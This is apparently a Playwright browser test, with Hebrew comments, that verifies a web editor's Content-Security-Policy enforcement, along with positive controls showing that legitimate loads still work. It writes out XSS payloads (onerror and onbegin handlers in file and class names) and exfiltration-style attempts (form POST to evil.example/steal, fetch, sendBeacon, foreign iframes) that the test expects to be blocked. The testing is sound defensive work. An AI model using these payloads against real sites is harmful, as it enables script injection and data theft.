/**
 * פרוסה C1 — ה-CSP ככותרת שרת, בדפדפן (Chromium, Playwright):   node kol-maroko/tests/browser/c1.cjs
 *
 * לא רק שהכותרות קיימות — שהדפדפן אוכף אותן: מה שנחסם נחסם, מה שאמור לעבוד עובד (ביקורת חיובית לכל חסימה), והדוחות
 * מגיעים ליומן — שולח אותם הדפדפן עצמו, עם העוגייה (HttpOnly, SameSite=Lax, כמו של הפלטפורמה), כמו בייצור.
 *
 *  א. הסטודיו (index.php, שלב א): object / base / form-action נחסמים; סקריפט בתוך הדף רץ (דיווח בלבד) ומדווח;
 *     התצוגה הישנה (srcdoc) עובדת; index.html ישירות — 403.
 *  ב. העורך (editor.php, שלב ב): סקריפט מוזרק, eval, handler, תמונה זרה, fetch החוצה (גם לאתר המחובר) ומסגרת זרה —
 *     נחסמים; תמונה ושמע מהאתר המחובר — נטענים; בשימוש רגיל (העורך, עורך הקוד ו-Monaco) — אפס הפרות לא צפויות;
 *     משאב חיצוני בקנבס — נספר כ"צפוי", לא שגיאה ביומן.
 *  ג. API: תשובה שנפתחת כמסמך — מקור אטום (sandbox), ואינה ניתנת למסגור.
 *  ד. שמות שהם HTML (קובץ) — אינם רצים גם כשמוזרקים כ-HTML.
 *
 * הבקשות לאתר המחובר ולדומיין הזר מנותבות ב-page.route ומקבלות תשובה מקומית — כך מה שחוסם הוא ה-CSP, לא הרשת.
 */
'use strict';
const { chromium } = require('playwright');
const { spawn, execFileSync } = require('child_process');
const fs = require('fs'), os = require('os'), path = require('path'), net = require('net');

const ROOT = path.resolve(__dirname, '..', '..');
const OWNER = { sub: 'u-owner', name: 'Owner Test', email: 'owner@example.test', email_verified: true, platform_admin: true };
const SITE = 'https://maghreb.co.il';          // ברירת המחדל של האתר המחובר (site_url_setting)
const EVIL = 'https://evil.example';
let failed = 0, ran = 0;
const ok = (cond, what) => { ran++; if (cond) console.log('✅ ' + what); else { failed++; console.log('❌ ' + what); } return !!cond; };
const freePort = () => new Promise(r => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const until = async (fn, ms = 8000) => { const t = Date.now(); for (;;) { try { const v = await fn(); if (v) return v; } catch { /* עוד לא */ } if (Date.now() - t > ms) return null; await sleep(100); } };
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
const WAV = (() => { const n = 800, b = Buffer.alloc(44 + n); b.write('RIFF', 0); b.writeUInt32LE(36 + n, 4); b.write('WAVEfmt ', 8); b.writeUInt32LE(16, 16); b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22);
  b.writeUInt32LE(8000, 24); b.writeUInt32LE(8000, 28); b.writeUInt16LE(1, 32); b.writeUInt16LE(8, 34); b.write('data', 36); b.writeUInt32LE(n, 40); b.fill(128, 44); return b; })();

(async () => {
  const data = fs.mkdtempSync(path.join(os.tmpdir(), 'kol-c1-'));
  execFileSync('php', [path.join(__dirname, 'f3-seed.php'), data, path.join(data, 'old-render.html')]);
  const port = await freePort(), base = `http://127.0.0.1:${port}`;
  const trace = path.join(data, 'trace.jsonl');
  const php = spawn('php', ['-S', `127.0.0.1:${port}`, path.join(ROOT, 'tests', 'router.php')], { cwd: ROOT, env: { ...process.env, KOL_TEST_DATA: data, KOL_TEST_TRACE: trace, PHP_CLI_SERVER_WORKERS: '6' }, stdio: 'ignore' });
  const seen = () => fs.existsSync(trace) ? fs.readFileSync(trace, 'utf8').trim().split('\n').filter(Boolean).map(l => JSON.parse(l)) : [];
  let browser;
  try {
    for (let i = 0; i < 100; i++) { try { await fetch(base + '/api.php?action=embed_key'); break; } catch { await sleep(50); } }
    browser = await chromium.launch();
    const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
    await ctx.addCookies([{ name: 'kol_test_user', value: Buffer.from(JSON.stringify(OWNER)).toString('base64'), url: base, httpOnly: true, sameSite: 'Lax' }]);
    const outside = [];                                           // כל בקשה שיצאה החוצה בפועל (אחרי ה-CSP)
    await ctx.route(/^https:\/\/(maghreb\.co\.il|evil\.example)\//, route => {
      const u = route.request().url(); outside.push(u);
      if (/\.png/.test(u)) return route.fulfill({ status: 200, contentType: 'image/png', body: PNG, headers: { 'Access-Control-Allow-Origin': '*' } });
      if (/\.wav/.test(u)) return route.fulfill({ status: 200, contentType: 'audio/wav', body: WAV, headers: { 'Access-Control-Allow-Origin': '*' } });
      return route.fulfill({ status: 200, contentType: 'text/plain', body: 'outside', headers: { 'Access-Control-Allow-Origin': '*' } });
    });
    const page = await ctx.newPage();
    const errors = [];
    page.on('pageerror', e => errors.push(e.message));
    if (process.env.C1_DEBUG) page.on('requestfailed', r => console.log('   [failed] ' + r.url() + ' ' + (r.failure() || {}).errorText));
    if (process.env.C1_DEBUG) page.on('console', m => console.log('   [console] ' + m.type() + ' ' + m.text().slice(0, 300)));
    const call = (action, body, query = '') => page.evaluate(([a, b, q]) => api(a, b ?? undefined, q), [action, body ?? null, query]);
    const reports = async (f = {}) => (await call('csp-reports')).reports.filter(r => Object.entries(f).every(([k, v]) => r[k] === v));

    // ════ א. הסטודיו — שלב א ════
    console.log('── א. הסטודיו (index.php, שלב א) ──');
    const res = await page.goto(base + '/');
    await page.waitForSelector('#tabs a');
    const h = res.headers();
    ok(/^object-src 'none'; base-uri 'self'; form-action 'self'; report-uri /.test(h['content-security-policy'] || '') && /script-src 'self'/.test(h['content-security-policy-report-only'] || '')
      && h['x-content-type-options'] === 'nosniff' && h['referrer-policy'] === 'strict-origin-when-cross-origin', 'הכותרות: שלוש הנחיות נאכפות, המדיניות המלאה בדיווח בלבד, nosniff, Referrer-Policy');
    await call('pf_migrate', {});                                 // העמוד המוסב (F3) — לחלקים ב ו-ד
    const A = await page.evaluate(async evil => {
      const out = { v: [] };
      document.addEventListener('securitypolicyviolation', e => out.v.push(e.effectiveDirective + ':' + e.disposition));
      const o = document.createElement('object'); o.data = 'assets/icon.svg'; o.type = 'image/svg+xml'; document.body.append(o);
      const baseBefore = document.baseURI; const b = document.createElement('base'); b.href = evil + '/'; document.head.prepend(b);
      out.base = document.baseURI === baseBefore; b.remove();
      const fr = document.createElement('iframe'); fr.name = 'c1sink'; fr.hidden = true; document.body.append(fr);
      const f = document.createElement('form'); f.method = 'post'; f.action = evil + '/steal'; f.target = 'c1sink'; document.body.append(f); f.submit();
      const s = document.createElement('script'); s.textContent = 'window.__c1inline = 1'; document.body.append(s); out.inline = window.__c1inline === 1;
      await new Promise(r => setTimeout(r, 800)); o.remove(); f.remove(); fr.remove();
      return out;
    }, EVIL);
    ok(A.v.includes('object-src:enforce') && A.v.includes('base-uri:enforce') && A.v.includes('form-action:enforce'), 'object, <base> זר ושליחת טופס החוצה — נחסמים ונאכפים (' + [...new Set(A.v)].join(', ') + ')');
    ok(A.base && !outside.some(u => u.includes('/steal')), '<base> לא שינה את כתובת הבסיס, והטופס לא יצא מהדפדפן');
    ok(A.inline && A.v.includes('script-src-elem:report'), 'סקריפט בתוך הדף — רץ (שלב א אינו שובר דבר) ומדווח כ"דיווח בלבד"');
    ok(await until(async () => (await reports({ policy: 'studio', directive: 'object-src', disposition: 'enforce' })).length && (await reports({ policy: 'studio', directive: 'script-src-elem', disposition: 'report' })).length),
      'הדוחות הגיעו ליומן מהדפדפן עצמו (report-uri, עם העוגייה) — מקובצים לפי מדיניות, הנחיה ומקור');
    // התצוגה הישנה (srcdoc בלי same-origin): הסקריפט שלה רץ, והעמוד מרונדר בה
    await page.goto(base + '/#/studio');
    const legacy = await until(async () => { for (const fr of page.frames()) { if (fr === page.mainFrame()) continue; const t = await fr.evaluate(() => document.body && document.body.innerText.trim().length).catch(() => 0); if (t > 20) return t; } return 0; }, 15000);
    ok(legacy > 20, `התצוגה של הסטודיו הישן (srcdoc) מרונדרת — הסקריפט שבה רץ תחת שלב א (${legacy} תווים)`);
    // הפרה בתוך התצוגה הישנה: המסגרת היא sandbox בלי allow-same-origin — מקור אטום. הדפדפן שולח את הדוח שלה כבקשה
    // ממקור זר, בלי העוגייה (SameSite) — והשרת אינו קולט דוח בלי זהות. פער ידוע (README); לשלב ב אין בו צורך: המסך הישן
    // נשאר בשלב א עד שהוא מוסר.
    const fromFrame = await until(() => seen().filter(t => t.uri.startsWith('/csp.php') && !t.user).length);
    ok(fromFrame && !(await reports({ doc: 'about:srcdoc', policy: 'studio' })).length, `הפרות בתוך התצוגה הישנה (מקור אטום): הדוח נשלח בלי זהות (${fromFrame}) — ואינו נקלט; פער מתועד`);
    const direct = await page.goto(base + '/index.html');
    ok(direct.status() === 403 && !(await page.content()).includes('app.js'), 'index.html בכתובת ישירה — 403, בלי הסטודיו (אין כתובת שמגישה אותו בלי הכותרות)');
    await page.goto(base + '/');                                  // ביקורת: הסטודיו ממשיך לעבוד
    ok(await page.waitForSelector('#tabs a', { timeout: 8000 }).then(() => true, () => false), 'ביקורת חיובית: הסטודיו נטען מ-/ (index.php)');

    // ════ ב. העורך — שלב ב ════
    console.log('\n── ב. העורך (editor.php, שלב ב) ──');
    await call('pf_create', { path: 'c1/page.html', content: '<!doctype html><html lang="he" dir="rtl"><head><meta charset="utf-8"><title>c1</title></head><body><h1 class="t">שלום</h1><p>טקסט</p></body></html>' });
    const er = await page.goto(base + '/editor.php#/editor/' + encodeURIComponent('c1/page.html'));
    await page.reload();
    await page.waitForFunction(() => typeof Editor !== 'undefined' && Editor._state.file && Editor._state.file.path === 'c1/page.html' && Editor._state.canvas && Editor._state.canvas.m && !Editor._state.busy, null, { timeout: 30000 });
    ok(/report-uri \/csp\.php\?p=editor$/.test(er.headers()['content-security-policy'] || ''), 'editor.php: המדיניות המלאה, עם report-uri ליומן');
    // עורך הקוד ו-Monaco (workers) באותו מסמך
    await page.goto(base + '/editor.php#/project'); await page.reload();
    await page.waitForSelector('.pj-tree .pj-row', { timeout: 20000 });
    const tree = Object.fromEntries((await call('pf_tree')).files.map(f => [f.path, f.id]));
    await page.evaluate(id => Project._open(id), tree['c1/page.html']);
    ok(await until(() => page.evaluate(id => !!(Project._state.docs.get(id) && Project._state.docs.get(id).model), tree['c1/page.html']), 20000), 'עורך הקוד (Monaco) נפתח תחת המדיניות המלאה');
    await sleep(1500);
    const normal = (await call('csp-reports')).reports.filter(r => r.policy === 'editor' && !r.expected);
    ok(normal.length === 0, 'בשימוש רגיל — העורך, הקנבס, עורך הקוד ו-Monaco — אפס הפרות לא צפויות של המדיניות' + (normal.length ? ': ' + normal.map(r => r.directive + ' ' + r.blocked).join(' · ') : ''));
    await page.goto(base + '/editor.php#/editor/' + encodeURIComponent('c1/page.html')); await page.reload();
    await page.waitForFunction(() => typeof Editor !== 'undefined' && Editor._state.canvas && Editor._state.canvas.m && !Editor._state.busy, null, { timeout: 30000 });
    const B = await page.evaluate(async ([site, evil]) => {
      const out = { v: [] };
      document.addEventListener('securitypolicyviolation', e => out.v.push(e.effectiveDirective));
      const s = document.createElement('script'); s.textContent = 'window.__c1e = 1'; document.body.append(s); out.inline = window.__c1e === 1;
      // מתוך משימה של הדף (setTimeout) — כדי שהקוד ייבדק בהקשר של הדף, לא של כלי הבדיקה
      await new Promise(r => setTimeout(() => { try { out.eval = (0, eval)('1+1') === 2; } catch { out.eval = false; } try { out.fn = new Function('return 1')() === 1; } catch { out.fn = false; } r(); }, 0));
      const d = document.createElement('div'); d.innerHTML = '<img src="x" onerror="window.__c1h = 1">'; document.body.append(d);
      const img = src => new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = src; });
      out.evilImg = await img(evil + '/x.png'); out.siteImg = await img(site + '/media/a.png');
      out.siteAudio = await new Promise(r => { const a = new Audio(); a.oncanplay = () => r(true); a.onerror = () => r(false); a.src = site + '/media/a.wav'; setTimeout(() => r(false), 4000); });
      out.evilAudio = await new Promise(r => { const a = new Audio(); a.oncanplay = () => r(true); a.onerror = () => r(false); a.src = evil + '/a.wav'; setTimeout(() => r(false), 4000); });
      out.fetchSite = await fetch(site + '/wp-json/').then(() => true, () => false);
      out.fetchEvil = await fetch(evil + '/x').then(() => true, () => false);
      navigator.sendBeacon(evil + '/b', 'x');
      const fr = document.createElement('iframe'); fr.src = evil + '/frame'; document.body.append(fr);
      await new Promise(r => setTimeout(r, 800));
      fr.remove();
      // הקנבס (srcdoc) יורש את המדיניות: תמונה מהאתר המחובר נטענת, מדומיין זר — לא
      const c = document.createElement('iframe');
      c.srcdoc = `<img id=a src="${site}/media/c.png"><img id=b src="${evil}/c.png"><script>window.__c1s = 1<\/script>`;
      document.body.append(c);
      await new Promise(r => setTimeout(r, 1200));
      const cd = c.contentDocument;
      out.canvasSite = cd.getElementById('a').naturalWidth === 1; out.canvasEvil = cd.getElementById('b').naturalWidth > 0; out.canvasScript = c.contentWindow.__c1s === 1;
      c.remove();
      await new Promise(r => setTimeout(r, 300));
      out.handler = window.__c1h === 1;
      return out;
    }, [SITE, EVIL]);
    ok(!B.inline && !B.eval && !B.fn && !B.handler, `סקריפט מוזרק, eval, new Function ו-onerror מ-HTML — אינם רצים (${[...new Set(B.v)].join(', ')})`);
    ok(!B.evilImg && !B.evilAudio && !B.canvasEvil, 'תמונה ושמע מדומיין זר — נחסמים, גם בקנבס (srcdoc יורש)');
    ok(B.siteImg && B.siteAudio && B.canvasSite, 'ביקורת חיובית: תמונה ושמע "באתר" (הדומיין המחובר) — נטענים ומתנגנים, גם בקנבס');
    if (process.env.C1_DEBUG) console.log(JSON.stringify(B));
    ok(!B.fetchSite && !B.fetchEvil, 'fetch לאתר המחובר ולדומיין זר, ו-sendBeacon — נחסמים (connect-src \'self\')');
    ok(B.v.includes('frame-src') && !outside.some(u => u.endsWith('/frame')) && !B.canvasScript, 'מסגרת מדומיין זר נחסמת (frame-src, הבקשה לא יצאה); סקריפט בקנבס אינו רץ');
    ok(!outside.some(u => /evil\.example/.test(u) || /wp-json/.test(u)), 'שום בקשה לדומיין הזר (גם לא sendBeacon, ולא fetch לאתר) לא יצאה מהדפדפן — ' + outside.length + ' בקשות יצאו, כולן מדיה מהאתר');
    const exp = await until(async () => { const r = await reports({ policy: 'editor', blocked: EVIL }); return r.length >= 2 ? r : null; });
    ok(exp && exp.filter(r => ['img-src', 'media-src'].includes(r.directive)).every(r => r.expected) && exp.some(r => r.directive === 'connect-src' && !r.expected),
      'בדוחות: תמונה/שמע זרים בעורך — "צפוי" (§2א, נספר בנפרד); fetch החוצה — לא צפוי: ' + (exp || []).map(r => `${r.directive}${r.expected ? '✓' : '!'}`).join(' '));
    const logged = await call('dev-log', null, '&category=csp').catch(() => null);
    const rows = logged && (logged.rows || logged.items || []);
    ok(!rows || !rows.some(r => /img-src|media-src/.test(r.event) && /editor/.test(r.message)), 'ביומן המפתח: אין שורת שגיאה על משאב חיצוני בקנבס' + (rows ? ` (${rows.length} שורות csp)` : ' (היומן לא נקרא — נבדק ב-PHP)'));

    // ════ ג. API ════
    console.log('\n── ג. API ──');
    const tab = await ctx.newPage();
    const ar = await tab.goto(base + '/api.php?action=me&x=' + encodeURIComponent('<script>window.top.__api=1</script>'));
    ok(ar.headers()['content-security-policy'] === "default-src 'none'; frame-ancestors 'none'; sandbox" && await tab.evaluate(() => self.origin) === 'null',
      'תשובת API שנפתחת כמסמך — בארגז חול: מקור אטום ("null"), בלי עוגייה ובלי אחסון');
    await page.goto(base + '/');
    await page.waitForSelector('#tabs a');
    const F = await page.evaluate(async () => {
      const load = src => new Promise(r => { const f = document.createElement('iframe'); f.src = src; document.body.append(f);
        f.onload = () => { let v; try { v = f.contentDocument ? f.contentDocument.documentElement.outerHTML.length : -1; } catch { v = -1; } f.remove(); r(v); }; setTimeout(() => { f.remove(); r(-2); }, 3000); });
      return { api: await load('api.php?action=me'), ctl: await load('assets/icon.svg') };
    });
    ok(F.api < 0 && F.ctl > 0, `api.php במסגרת — נחסם (frame-ancestors 'none'); ביקורת חיובית: קובץ סטטי במסגרת — נטען (${F.api}/${F.ctl})`);

    // ════ ד. שם שהוא HTML ════
    console.log('\n── ד. שמות שהם HTML ──');
    const NAME = '<img src=x onerror=window.top.__pwn=1>.html';
    await call('pf_create', { path: 'c1/' + NAME, content: '<p class="<img src=x onerror=window.top.__pwn=2>">x</p>' });
    await page.goto(base + '/editor.php#/project'); await page.reload();
    await page.waitForSelector('.pj-tree .pj-row', { timeout: 20000 });
    await sleep(600);
    const D = await page.evaluate(async name => {
      const shown = document.body.innerText.includes(name.slice(0, 12));
      const box = document.createElement('div'); box.innerHTML = name + '<svg><animate onbegin="window.top.__pwn=3" attributeName="x" dur="1s"/></svg>'; document.body.append(box);   // "גם אם אחד המסכים הציג אותם בטעות כ-HTML"
      await new Promise(r => setTimeout(r, 600)); box.remove();
      return { shown, pwn: window.__pwn };
    }, NAME);
    ok(D.pwn === undefined, 'שם קובץ ושם מחלקה שהם HTML — אינם מריצים קוד, גם כשמוזרקים כ-HTML למסך המוקשח' + (D.shown ? ' (והעץ מציג את השם כטקסט)' : ''));

    ok(errors.length === 0, 'בלי שגיאות JS בדף' + (errors.length ? ': ' + errors.slice(0, 3).join(' | ') : ''));
  } catch (e) {
    failed++;
    console.log('❌ הבדיקה נפלה: ' + (e && e.stack || e));
  } finally {
    if (browser) await browser.close();
    php.kill();
    fs.rmSync(data, { recursive: true, force: true });
  }
  console.log('\n' + (failed ? `נכשלו ${failed} מתוך ${ran}` : `כל ${ran} הבדיקות עברו`));
  process.exit(failed ? 1 : 0);
})();
